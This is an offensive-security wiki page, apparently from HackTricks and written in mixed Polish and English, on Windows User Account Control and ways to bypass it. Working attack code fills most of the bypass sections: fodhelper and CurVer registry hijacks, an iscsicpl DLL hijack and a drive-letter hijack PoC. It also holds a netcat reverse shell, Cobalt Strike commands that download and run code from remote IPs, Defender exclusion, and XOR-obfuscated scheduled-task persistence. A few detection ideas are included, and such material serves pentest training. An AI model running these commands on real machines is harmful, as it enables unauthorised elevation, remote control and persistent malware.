# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a funkcja, która umożliwia **prompt zgody dla podniesionych działań**. Applications mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogą potencjalnie skompromitować system**. Gdy UAC jest włączone, applications i tasks zawsze **uruchamiają się w security context konta niebędącego administratorem**, chyba że administrator wyraźnie autoryzuje te applications/tasks do uzyskania dostępu na poziomie administratora do uruchomienia w systemie. Jest to funkcja wygody, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.

Więcej info o integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest włączone, użytkownik administratora dostaje 2 tokeny: standardowy klucz użytkownika, do wykonywania zwykłych akcji na zwykłym poziomie, oraz jeden z uprawnieniami admina.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) omawia szczegółowo, jak działa UAC, i zawiera proces logowania, user experience oraz architekturę UAC. Administratorzy mogą używać security policies do konfiguracji działania UAC specyficznie dla swojej organizacji na poziomie lokalnym (za pomocą secpol.msc), albo skonfigurować je i rozpropagować przez Group Policy Objects (GPO) w środowisku Active Directory domain. Różne ustawienia są omówione szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 Group Policy settings. Poniższa tabela zawiera dodatkowe szczegóły:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**Lokalne polityki bezpieczeństwa** ("secpol.msc" na większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym adminami instalowanie software**. Oznacza to, że nawet jeśli użytkownik niebędący adminem może pobrać instalator twojego software, nie będzie mógł go uruchomić bez konta admina.

### Registry Keys to Force UAC to Ask for Elevation

Jako standard user bez praw admina możesz upewnić się, że standardowe konto zostanie **poproszone przez UAC o credentials** podczas próby wykonania określonych działań. Ta akcja wymagałaby modyfikacji pewnych **registry keys**, do czego potrzebujesz uprawnień admina, chyba że istnieje **UAC bypass**, albo attacker jest już zalogowany jako admin.

Nawet jeśli użytkownik należy do grupy **Administrators**, te zmiany zmuszają użytkownika do **ponownego wpisania credentials konta**, aby wykonać działania administracyjne.

**Jedyną wadą jest to, że to podejście wymaga wyłączonego UAC, aby działało, co w środowiskach produkcyjnych jest mało prawdopodobne.**

Registry keys i wpisy, które musisz zmienić, są następujące (z ich domyślnymi wartościami w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie przez narzędzie Local Security Policy. Po zmianie operacje administracyjne będą wymagać od użytkownika ponownego wpisania credentials.

### Note

**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standard users nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez exploit local privilege escalation.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode uses integrity checks to prevent high-integrity-level processes (like web browsers) from accessing low-integrity-level data (like the temporary Internet files folder). This is done by running the browser with a low-integrity token. When the browser attempts to access data stored in the low-integrity zone, the operating system checks the integrity level of the process and allows access accordingly. This feature helps prevent remote code execution attacks from gaining access to sensitive data on the system.
- When a user logs on to Windows, the system creates an access token that contains a list of the user's privileges. Privileges are defined as the combination of a user's rights and capabilities. The token also contains a list of the user's credentials, which are credentials that are used to authenticate the user to the computer and to resources on the network.

### Autoadminlogon

To configure Windows to automatically log on a specific user at startup, set the **`AutoAdminLogon` registry key**. This is useful for kiosk environments or for testing purposes. Use this only on secure systems, as it exposes the password in the registry.

Set the following keys using the Registry Editor or `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

To revert to normal logon behavior, set `AutoAdminLogon` to 0.

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell z użytkownikiem, który należy do grupy Administrators, możesz **zamontować udział C$** udostępniony przez SMB (system plików) lokalnie jako nowy dysk i będziesz mieć **dostęp do wszystkiego w systemie plików** (nawet folderu domowego Administratora).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass z cobalt strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom bezpieczeństwa
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** również mają kilka modułów do **bypass** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie w [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), które jest **kompilacją** kilku UAC bypass exploits. Zwróć uwagę, że będziesz musiał **skompilować UACME używając visual studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (takich jak `Source\Akagi\outout\x64\Debug\Akagi.exe`) , musisz wiedzieć **który z nich potrzebujesz.**\
Powinieneś **uważać**, ponieważ niektóre bypasses będą **uruchamiać inne programy**, które będą **alarmować** **użytkownika**, że coś się dzieje.

UACME ma **wersję build**, od której każda technika zaczęła działać. Możesz wyszukać technikę wpływającą na twoje wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Zaufany binarny plik `fodhelper.exe` jest auto-elevated na nowoczesnym Windows. Po uruchomieniu sprawdza poniższą ścieżkę rejestru per-user bez weryfikacji verbu `DelegateExecute`. Umieszczenie tam komendy pozwala procesowi o Medium Integrity (user jest w Administrators) uruchomić proces o High Integrity bez promptu UAC.

Ścieżka rejestru sprawdzana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw swój payload, a potem uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators i poziom UAC jest domyślny/łagodny (nie Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu na 64-bitowym Windows.
- Payload może być dowolną komendą (PowerShell, cmd lub ścieżka do EXE). Unikaj wywoływania UI dla większej stealth.

#### Wariant hijack CurVer/extension (tylko HKCU)

Nowsze próbki wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** przez per-user wartość `CurVer`. Binarka auto-elevated nadal rozwiązuje handler w `HKCU`, więc nie jest potrzebny token admina, aby dodać klucze:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po podniesieniu uprawnień malware często **wyłącza przyszłe monity** przez ustawienie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania w zakresie defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z wysoką integralnością. Typowe zadanie persistence przechowuje na dysku **skrypt PowerShell zaszyfrowany XOR** i co godzinę dekoduje go oraz wykonuje w pamięci:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ta wersja nadal czyści dropper i zostawia tylko staged payloads, przez co wykrywanie opiera się na monitorowaniu **`CurVer` hijack**, manipulacji `ConsentPromptBehaviorAdmin`, tworzeniu wykluczeń Defendera albo zaplanowanych zadań, które w pamięci deszyfrują PowerShell.

#### Więcej UAC bypass

**Wszystkie** techniki użyte tutaj do obejścia AUC **wymagają** **pełnej interaktywnej powłoki** z ofiarą (zwykła shell nc.exe nie wystarczy).

Możesz to uzyskać, używając sesji **meterpreter**. Przełącz się do **procesu**, którego wartość **Session** wynosi **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI, po prostu możesz zaakceptować monit UAC**, gdy się pojawi, tak naprawdę nie potrzebujesz bypassu. Uzyskanie dostępu do GUI pozwoli więc obejść UAC.

Ponadto, jeśli dostaniesz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), są **pewne narzędzia, które będą uruchomione jako administrator**, z których możesz **uruchomić** na przykład **cmd** bezpośrednio **jako admin**, bez ponownego monitu UAC, jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). To może być trochę bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli nie przeszkadza ci bycie głośnym, możesz zawsze **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co **będzie prosić o podniesienie uprawnień, aż użytkownik to zaakceptuje**.

### Własny bypass - podstawowa metodologia UAC bypass

Jeśli spojrzysz na **UACME**, zauważysz, że **większość UAC bypassów nadużywa podatności Dll Hijacking** (głównie poprzez zapisanie złośliwego dll w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź binarkę, która będzie się **autoelevate** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integrity).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** DLL wewnątrz jakichś **protected paths** (jak C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść używając:
1. **wusa.exe**: Windows 7,8 i 8.1. Pozwala wyekstrahować zawartość pliku CAB do protected paths (ponieważ to narzędzie jest uruchamiane z wysokiego poziomu integrity).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, aby skopiować DLL do protected path i uruchomić podatną oraz autoelevated binarkę.

### Inna technika UAC bypass

Polega na sprawdzeniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** binarki lub **polecenia**, które ma zostać **wykonane** (jest to ciekawsze, jeśli binarka szuka tych informacji w **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to **auto-elevated** binary, którą można nadużyć do załadowania `iscsiexe.dll` przez search order. Jeśli możesz umieścić złośliwy `iscsiexe.dll` w folderze **user-writable**, a następnie zmodyfikować bieżący `PATH` użytkownika (na przykład przez `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować DLL atakującego do procesu podniesionego `iscsicpl.exe` **bez wyświetlania monitu UAC**.

Uwagi praktyczne:
- To jest przydatne, gdy bieżący użytkownik należy do **Administrators**, ale działa z **Medium Integrity** z powodu UAC.
- Kopia z **SysWOW64** jest tą właściwą dla tego bypassu. Traktuj kopię z **System32** jako osobną binarkę i zweryfikuj zachowanie niezależnie.
- Primitiva to połączenie **auto-elevation** i **DLL search-order hijacking**, więc ten sam workflow ProcMon używany przy innych UAC bypassach jest przydatny do potwierdzenia brakującego ładowania DLL.

Minimalny flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły na detection:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Kroki:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
